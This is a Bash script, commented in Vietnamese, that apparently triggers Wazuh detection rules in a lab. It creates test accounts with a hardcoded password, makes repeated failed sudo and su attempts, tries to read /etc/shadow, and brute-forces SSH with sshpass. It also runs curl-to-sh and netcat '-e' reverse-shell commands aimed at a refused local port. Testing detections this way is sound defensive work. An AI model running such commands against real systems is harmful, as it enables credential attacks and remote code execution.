#!/usr/bin/env bash
# =====================================================================
# ubuntu-trigger.sh  -  Tu dong sinh hanh vi kiem thu rule Wazuh
# May: ubuntu-lab (agent 014, 192.168.19.129, Ubuntu 24.04)
# CHI DUNG TRONG LAB. Moi payload vo hai (khong mo shell that, khong tai ma doc).
#
# Cach dung (chay bang quyen root):
#   sudo ./ubuntu-trigger.sh prep     # tao tai khoan thu + cai sshpass, expect
#   sudo ./ubuntu-trigger.sh 13.2     # chay mot ca
#   sudo ./ubuntu-trigger.sh hv13     # chay ca mot hanh vi
#   sudo ./ubuntu-trigger.sh all      # chay tat ca ca Linux
#   sudo ./ubuntu-trigger.sh clean    # xoa tai khoan thu
#
# Sau khi chay, mo Dashboard -> Threat Hunting -> Events, chon dung khung gio,
# loc:  agent.id: "014" and rule.id: <ID>
# File CSV bang chung ghi canh file script: trigger-ubuntu-<thoigian>.csv
# =====================================================================
set -u

TARGET_IP="192.168.19.129"   # IP chinh ubuntu-lab, dung lam dich SSH tu-thu
DOMAIN="roduygolab.nms"      # mien AD da join
TESTPW="Lab@123456"          # mat khau tai khoan thu
GAP=3                        # so giay nghi giua cac ca
LOG="trigger-ubuntu-$(date +%Y%m%d-%H%M%S).csv"

# --- bat buoc chay bang root ---
if [ "$(id -u)" -ne 0 ]; then
  echo "Phai chay bang root:  sudo $0 $*"; exit 1
fi

# --- ghi mot moc bang chung: mark <ca> <rule> <mo ta> ---
mark() {
  local t; t=$(date '+%Y-%m-%d %H:%M:%S')
  printf '\n>>> %s | [%s] rule mong doi: %s\n    %s\n' "$t" "$1" "$2" "$3"
  if [ ! -f "$LOG" ]; then echo '"thoi_gian","host","ca","rule_mong_doi","mo_ta"' > "$LOG"; fi
  printf '"%s","ubuntu-lab","%s","%s","%s"\n' "$t" "$1" "$2" "$3" >> "$LOG"
}
pause() { sleep "$GAP"; }

# =====================================================================
# CHUAN BI
# =====================================================================
do_prep() {
  echo "== Cai cong cu phu tro =="
  apt-get update -qq
  apt-get install -y -qq sshpass expect netcat-traditional >/dev/null 2>&1
  echo "== Tao 3 tai khoan thu (bo qua neu da co) =="
  id labsudo     >/dev/null 2>&1 || useradd -m -s /bin/bash -G sudo labsudo
  id labnosudo   >/dev/null 2>&1 || useradd -m -s /bin/bash labnosudo
  id labrestrict >/dev/null 2>&1 || useradd -m -s /bin/bash labrestrict
  echo "labsudo:$TESTPW"     | chpasswd
  echo "labnosudo:$TESTPW"   | chpasswd
  echo "labrestrict:$TESTPW" | chpasswd
  echo 'labrestrict ALL=(ALL) /usr/bin/ls' > /etc/sudoers.d/labrestrict
  chmod 440 /etc/sudoers.d/labrestrict
  visudo -c >/dev/null && echo "sudoers OK"
  echo "Xong chuan bi. Luu y: tao tai khoan nay cung lam rule HV3/HV4 ban - binh thuong."
}

do_clean() {
  echo "== Xoa tai khoan thu =="
  rm -f /etc/sudoers.d/labrestrict
  userdel -r labsudo     2>/dev/null
  userdel -r labnosudo   2>/dev/null
  userdel -r labrestrict 2>/dev/null
  echo "Xong."
}

# --- helpers chay sudo/su duoi danh nghia tai khoan khac (khong can mat khau vi dang la root) ---
# sudo sai N lan trong MOT lenh, duoi danh nghia $1
sudo_fail_once() { # <user>
  local pw; pw="sai-$RANDOM"
  runuser -u "$1" -- bash -c "echo '$pw' | sudo -S -k id >/dev/null 2>&1"
}
sudo_fail_triple() { # <user>  -> 3 lan sai trong 1 lenh
  runuser -u "$1" -- bash -c "printf 'w1\nw2\nw3\n' | sudo -S -k id >/dev/null 2>&1"
}
sudo_success() { # <user>  -> go dung mat khau (tai khoan phai co quyen sudo)
  runuser -u "$1" -- bash -c "printf '$TESTPW\n' | sudo -S -k id >/dev/null 2>&1"
}

# =====================================================================
# HV13 - sudo that bai
# =====================================================================
c_13_1() { mark 13.1 100500 "sudo sai mat khau 1 lan (labsudo)"
  sudo_fail_once labsudo; }
c_13_2() { mark 13.2 100501 "sudo sai 3 lan trong 1 lenh (labsudo)"
  sudo_fail_triple labsudo; }
c_13_3() { mark 13.3 100504 "4 lan sudo that bai trong 5 phut (labsudo)"
  sudo_fail_once labsudo; sleep 2; sudo_fail_once labsudo; sleep 2
  sudo_fail_once labsudo; sleep 2; sudo_fail_once labsudo; }
c_13_4() { mark 13.4 "100502,100505" "labnosudo (khong co quyen) thu sudo 3 lan"
  sudo_fail_once labnosudo; sleep 2; sudo_fail_once labnosudo; sleep 2; sudo_fail_once labnosudo; }
c_13_5() { mark 13.5 100503 "labrestrict chay lenh khong duoc phep (cat /etc/shadow)"
  runuser -u labrestrict -- bash -c "printf '$TESTPW\n' | sudo -S -k cat /etc/shadow >/dev/null 2>&1"; }
c_13_6() { mark 13.6 100506 "tai khoan dich vu www-data thu sudo"
  runuser -u www-data -- bash -c "echo sai | sudo -S -k id >/dev/null 2>&1"; }
c_13_7() { mark 13.7 100507 "sudo thanh cong ngay sau chuoi that bai (labsudo)"
  sudo_fail_once labsudo; sleep 1; sudo_fail_once labsudo; sleep 1; sudo_success labsudo; }
c_13_8() { mark 13.8 "100508,100509,100510" "su that bai: 1 lan len labsudo + 5 lan len root"
  runuser -u labnosudo -- expect -c 'spawn su - labsudo; expect "assword:"; send "sai\r"; expect eof' >/dev/null 2>&1
  for i in 1 2 3 4 5; do
    runuser -u labnosudo -- expect -c 'spawn su - root; expect "assword:"; send "sai\r"; expect eof' >/dev/null 2>&1
    sleep 1
  done; }
hv13() { c_13_1; pause; c_13_2; pause; c_13_3; pause; c_13_4; pause; c_13_5; pause; c_13_6; pause; c_13_7; pause; c_13_8; }

# =====================================================================
# HV1 ca 1.5 / HV12 - SSH brute force bang sshpass (nguon = chinh may nay)
# Luu y: srcip trong canh bao se la 192.168.19.129 (tu-thu), khong phai .130.
#        Muon nguon = Win10 thi dung phan SSH trong win-trigger.ps1.
# =====================================================================
ssh_fail() { # <user-spec>  mot lan dang nhap sai
  sshpass -p "sai-$RANDOM" ssh -o PreferredAuthentications=password \
    -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    -l "$1" "$TARGET_IP" true >/dev/null 2>&1
}
c_1_5() { mark 1.5 "100112,100114" "12 lan SSH sai tai khoan domain labuser1 (lan 10 -> 100114)"
  for i in $(seq 1 11); do ssh_fail "labuser1@$DOMAIN"; done
  ssh_fail "khongtontai@$DOMAIN"; }     # lan cuoi tai khoan khong co that
c_12_1() { mark 12.1 "100480,100482" "nhieu lan SSH root sai mat khau"
  for i in $(seq 1 6); do ssh_fail "root"; sleep 1; done; }
hv1_ssh() { c_1_5; }
hv12() { c_12_1; }

# =====================================================================
# HV5 ca 5.11 - Linux: chuoi tai-ve-roi-dua-vao-shell qua sudo (100357)
# URL tro toi cong dong (127.0.0.1:9) nen ket noi bi tu choi ngay, khong tai gi.
# =====================================================================
c_5_11() { mark 5.11 100357 "sudo chay chuoi curl|sh (vo hai, ket noi bi tu choi)"
  runuser -u labsudo -- bash -c "printf '$TESTPW\n' | sudo -S -k sh -c 'curl -s http://127.0.0.1:9/x | sh' >/dev/null 2>&1"; }
c_5_12() { mark 5.12 "100356,100357" "nc.traditional voi -e (reverse shell gia, ket noi tu choi)"
  runuser -u labsudo -- bash -c "printf '$TESTPW\n' | sudo -S -k nc.traditional -e /bin/true 127.0.0.1 9 >/dev/null 2>&1"; }
hv5_linux() { c_5_11; pause; c_5_12; }

# =====================================================================
# DIEU PHOI
# =====================================================================
run_all() { hv13; pause; hv1_ssh; pause; hv12; pause; hv5_linux; }

case "${1:-}" in
  prep)   do_prep ;;
  clean)  do_clean ;;
  all)    run_all ;;
  hv13)   hv13 ;;
  hv12)   hv12 ;;
  hv5)    hv5_linux ;;
  1.5)    c_1_5 ;;
  13.1) c_13_1 ;; 13.2) c_13_2 ;; 13.3) c_13_3 ;; 13.4) c_13_4 ;;
  13.5) c_13_5 ;; 13.6) c_13_6 ;; 13.7) c_13_7 ;; 13.8) c_13_8 ;;
  12.1) c_12_1 ;; 5.11) c_5_11 ;; 5.12) c_5_12 ;;
  *) echo "Dung: sudo $0 {prep|clean|all|hv13|hv12|hv5|13.1..13.8|12.1|1.5|5.11|5.12}"; exit 1 ;;
esac

if [ -f "$LOG" ]; then echo; echo "== Bang chung ghi vao: $(pwd)/$LOG =="; fi
echo "Mo Dashboard, loc theo:  agent.id: \"014\" and rule.id: <ID>  (khung gio = Last 15 minutes)"
